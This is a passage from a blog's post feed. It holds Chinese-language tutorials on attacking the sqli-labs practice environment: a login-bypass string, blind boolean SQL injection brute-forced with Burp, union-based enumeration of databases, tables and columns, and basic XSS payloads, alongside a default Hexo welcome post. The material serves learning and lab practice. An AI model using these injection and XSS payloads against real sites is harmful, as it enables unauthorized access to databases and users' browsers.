<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">MATHJAX<span class="hljs-operator">-</span>SSR<span class="hljs-number">-20</span>username<span class="hljs-string">&#x27; and password=&#x27;</span>$password<span class="hljs-string">&#x27; limit 0,1&quot;</span><br></code></pre></td></tr></table></figure>
<p>因此账号密码同时尝试输入：<code>admin&#39; or &#39;1&#39;=&#39;1#</code><img src="https://img-blog.csdnimg.cn/20210509173457214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们来看一下解释<img src="https://img-blog.csdnimg.cn/20210509173530412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>SQL-labs-Burp(第八关)</title>
    <url>/2021/06/05/SQL-labs-Burp(%E7%AC%AC%E5%85%AB%E5%85%B3)/</url>
    <content><![CDATA[<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在上篇文章中我们进行sqli-labs第八关时选择的是手注，可见过程是多么繁琐，因此在本文将会演示如何使用Burp作为辅助工具进行爆破</p>
<h1 id="一、数据库长度"><a href="#一、数据库长度" class="headerlink" title="一、数据库长度"></a>一、数据库长度</h1><p>注入语句，进行爆破判断</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database())=8 --+</span><br></code></pre></td></tr></table></figure>
<p><strong>抓包</strong><br><img src="https://img-blog.csdnimg.cn/20210403165234410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>进行爆破</strong><br><img src="https://img-blog.csdnimg.cn/20210403165305685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>处理数据</strong><br><img src="https://img-blog.csdnimg.cn/20210403165321714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>设置payload</strong><br><img src="https://img-blog.csdnimg.cn/20210403165346698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>进行攻击</strong><br><img src="https://img-blog.csdnimg.cn/20210403165422453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>判断出数据库的长度为：8</strong></p>
<h1 id="二、数据库名"><a href="#二、数据库名" class="headerlink" title="二、数据库名"></a>二、数据库名</h1><p><img src="https://img-blog.csdnimg.cn/20210403165601415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>代码块：<code>?id=1&#39; and ascii(substr(database(),1,1))=115 --+</code></p>
<p><strong>抓包</strong><img src="https://img-blog.csdnimg.cn/20210403165659956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>将字符的位置1，和对应ASCII码115设置为测试的数字，攻击类型设置为集束炸弹</strong><br><img src="https://img-blog.csdnimg.cn/20210403170043417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>设置payload</strong><br>我们已经知道了数据库名称的长度为：8，因此<br><strong>1、第一个参数的设置为1-8</strong><br><img src="https://img-blog.csdnimg.cn/20210403171134895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2、设置第二个参数，数据库名是小写的26个字母，a-z的ASCII码是97-122</strong><br><img src="https://img-blog.csdnimg.cn/20210403171252758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>开始攻击</strong><br><img src="https://img-blog.csdnimg.cn/20210403171644839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后得到8个不一样的长度，正好对应数据库的名称：<strong>security</strong></p>
<h1 id="三、爆表名"><a href="#三、爆表名" class="headerlink" title="三、爆表名"></a>三、爆表名</h1><p>大致流程与上面的方法是一致的<br><strong>爆长度</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;   and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210403172517941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210403172614673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>长度为6<br><strong>爆表</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; limit 0,1),1,1)) =101 --+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210403172735427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>进行爆破</strong><br><img src="https://img-blog.csdnimg.cn/20210403173205373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>设置payload</strong><br><img src="https://img-blog.csdnimg.cn/20210403173240378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>设置有效载荷量其过程大致与上面差不多，只不过该表名的长度为6</strong><br><img src="https://img-blog.csdnimg.cn/20210403173357545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210403173405171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>爆破成功</strong><br><img src="https://img-blog.csdnimg.cn/20210403173657691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>对应ASCII码表，表名为：emails</strong></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>接下来对<strong>表的字段爆破</strong>以及<strong>字段信息的提取</strong>都依据上述的大概流程进行爆破，其实这样爆破虽然省下不少事但同时也要对注入语句进行学习才可以更加熟练。</p>
]]></content>
  </entry>
  <entry>
    <title>XSS初探</title>
    <url>/2021/06/05/XSS-%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS。</p>
<p>XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。那么什么是XSS呢？</p>
<p>XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。</p>
<p>从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</p>
<h1 id="一、XSS跨站脚本实例"><a href="#一、XSS跨站脚本实例" class="headerlink" title="一、XSS跨站脚本实例"></a>一、XSS跨站脚本实例</h1><p>在学习的过程中对于XSS的学习需要掌握两种语种：<code>JAVAScript</code>和<code>HTML</code><br>为了更好的了解XSS我们进行一下实例：<br><img src="https://img-blog.csdnimg.cn/20210319095142799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开之后<img src="https://img-blog.csdnimg.cn/20210319095251364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在这段HTML代码中，包含了一个JAVAScript语句块，使用内置的alert()函数来打开消息框中内容，保存为HTML文件，打开后就会出现这个。我们来看一下XSS攻击的解释：<img src="https://img-blog.csdnimg.cn/20210319095814391.png" alt="在这里插入图片描述"><br>XSS弹出恶意警告框：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span>script<span class="hljs-operator">&gt;</span>alert(&quot;XSS&quot;);<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>script<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
<p>使网页不停刷新：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span>meta http<span class="hljs-operator">-</span>equiv<span class="hljs-operator">=</span>&quot;refresh&quot; content<span class="hljs-operator">=</span>&quot;0;&quot;<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210319100346433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>嵌入其他网站链接：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span>iframe src<span class="hljs-operator">=</span>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com width<span class="hljs-operator">=</span><span class="hljs-number">0</span> heigh<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>iframe<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210319100521323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="二-、原理复现"><a href="#二-、原理复现" class="headerlink" title="二 、原理复现"></a>二 、原理复现</h1><p>index.php文件里写入如下代码:<br><img src="https://img-blog.csdnimg.cn/20210319110150615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210319110216381.png" alt="在这里插入图片描述"><br>随便输入：2342131<br><img src="https://img-blog.csdnimg.cn/20210319110328683.png" alt="在这里插入图片描述"><br>查看页面源代码<br><img src="https://img-blog.csdnimg.cn/20210319110732687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>可以发现我们输入的数字被完整的输出了，那么当我们使用弹窗测试是否存在xss漏洞输入：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>那么<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>应该也会出现在13行的<code>&lt;br&gt; &lt;br&gt;</code>中，let we to try!<br><img src="https://img-blog.csdnimg.cn/20210319110835511.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210319110848272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功弹窗基本上就可以确定存在xss漏洞。</p>
<p>查看页面的源代码<br><img src="https://img-blog.csdnimg.cn/20210319110901403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="三、XSS分类"><a href="#三、XSS分类" class="headerlink" title="三、XSS分类"></a>三、XSS分类</h1><ul>
<li>反射型xss攻击</li>
<li>存贮型xss攻击</li>
<li>DOMBasedXSS（基于dom的跨站点脚本攻击）<br>具体解释在这里就不说明了今天我们着重实操一下反射型</li>
</ul>
<h2 id="反射型："><a href="#反射型：" class="headerlink" title="反射型："></a>反射型：</h2><p>又<strong>称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。</strong></p>
<p><img src="https://img-blog.csdnimg.cn/2021031910420730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210319104150592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下面我们尝试注入Js语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&lt;</span>script<span class="hljs-operator">&gt;</span>alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>script<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210319104537237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注入成功<br>其实在使用中弹窗的作用是为了测试xss的存在性和使用性。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>怎么讲，XSS学起来很不简单，并不是一两句话就可以讲明白，需要不断的进行学习以及尝试，对于我学起来确实很吃力，但也只能一步一步去看去走了。</p>
<p>对了，学习XSS同样需要掌握它的语言可以去看看<a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">这里</a>，同样<strong>JAVAScript、HTML、PHP</strong>也需要不断学习。</p>
<p>今天这篇文章写的很糙，这也说明我了解的太少，随着学习的深入希望也能总结的更加清晰吧。</p>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/01/29/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>SQL注入-联合查询入门</title>
    <url>/2021/02/05/SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>联合查询：<br>一：按照注入语法分为:联合查询注入Union/报错查询注入error/布尔型注入Boolean/延时注入Time/堆叠查询注入</p>
<p>二：联合查询注入是最简单的一种注入方式,但是要求页面必须有显示位.否则无法注入.</p>
<p>显示位:可以理解为从数据库提取的数据被显示在前端. 如果没有显示位,我们无法查看注入的结果.</p>
<p>三：联合查询一般步骤：<br>1、判断注入点还是整形或字符型<br>2、判断查询列数<br>3、判断显示位<br>4、获取所有数据库名<br>5、获取数据库所有表名<br>6、获取字段名<br>7、获取字段中的数据</p>
<p>在这里我们通过举例第一关来讲解<br>开始前我们需要掌握Mysql必会查询的语句：</p>
<ol>
<li>   select database();  #查看当前库名;</li>
<li>   select table_name from information_schema.tables where     table_schema=database()  ;  #查看当前库下的表名</li>
<li>   select column_name from information_schema.columns where table_schema=database() and table_name=’user’;  #查询列名</li>
<li>   select name,password from user;   #获取用户名和密码列<h1 id="一、判断注入点还是整形或字符型"><a href="#一、判断注入点还是整形或字符型" class="headerlink" title="一、判断注入点还是整形或字符型"></a>一、判断注入点还是整形或字符型</h1>在sql变量后添加以下内容来判断类型：</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> / <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> 回显页面不同(整形判断) <br></code></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">单引号判断‘ 显示数据库错误信息或者页面回显不同(整形,字符串类型判断) <br></code></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">\ (转义符) <br></code></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">-1</span>/+<span class="hljs-number">1</span> 回显下一个或上一个页面(整型判断)<br></code></pre></td></tr></table></figure>
<p>注：加号‘+’在URL中有特殊含义，因此在需要对其进行URL编码为%2b</p>
<p>先判断是否存在注入,如果存在(正常和异常页面显示不同则存在注入)是字符型还是整型注入。<br><img src="https://img-blog.csdnimg.cn/20210205154410931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里是显示正常的，添加<code>and1=1</code>以及<code>and1=2</code>(1=2为假）来判断是否为整形注入<br><img src="https://img-blog.csdnimg.cn/20210205154917253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210205154933740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出页面均显示正常因此不是整形注入</p>
<p>加<code>’</code>以及<code>--+</code>注释说明来判断是否为字符型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">1</span>’and1=<span class="hljs-number">1</span>--+ 时<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210205155300845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>显示页面异常</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">1</span>’and1=<span class="hljs-number">2</span>--+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210205155449629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>显示页面错误，故可判断为字符注入</p>
<h1 id="二、判断列数"><a href="#二、判断列数" class="headerlink" title="二、判断列数"></a>二、判断列数</h1><p>order by （用来查询列数）用来对表里的数据进行排序,order  by 1 表示按照第一列进行排序.依次类推.<br><code>？id=1&#39; order by 1</code><br>从1到3：均显示正常<img src="https://img-blog.csdnimg.cn/20210205160435794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">order by <span class="hljs-number">4</span>--+ 时<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210205160624180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>显示异常，说明没有第4列，只存在前3列</p>
<h1 id="三-找到显示位"><a href="#三-找到显示位" class="headerlink" title="三.找到显示位"></a>三.找到显示位</h1><p>UNION的作用是将两个select查询结果合并，为了爆出第一位后面的显示位需要隐藏正常结果，比如将<code>？id=1</code>改为<code>？id=-1</code>，使union前面的语句报错，执行后面的，爆出显示位</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">-1</span>’<span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210205162344790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210205162403821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出只有当id=-1时才可以爆出笑显示位，显示位：2和3，可以插入查询语句</p>
<h1 id="四-获取库名"><a href="#四-获取库名" class="headerlink" title="四.获取库名"></a>四.获取库名</h1><p>group_concat()一次性显示： </p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function">select <span class="hljs-title">group_concat</span><span class="hljs-params">(SCHEMA_NAME)</span> from information_schema.SCHEMATA</span><br></code></pre></td></tr></table></figure>
<p>显示当前数据库： databas()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">？id=<span class="hljs-number">-1&#x27;u</span>nion select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210205163109214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到库名：security</p>
<h1 id="五-获取表名"><a href="#五-获取表名" class="headerlink" title="五.获取表名"></a>五.获取表名</h1><p>从获取库名的讲解，在这里使用group_concat()函数加一个数据表名table_name,然后指定一个来源得到库中的表名</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs c">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210205164455524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到表名：emails，referers，uagents，users</p>
<h1 id="六-获取列名"><a href="#六-获取列名" class="headerlink" title="六.获取列名"></a>六.获取列名</h1><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs c">?id=-1&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+<br></code></pre></td></tr></table></figure>
<p>从users中获取<br><img src="https://img-blog.csdnimg.cn/20210205165516791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
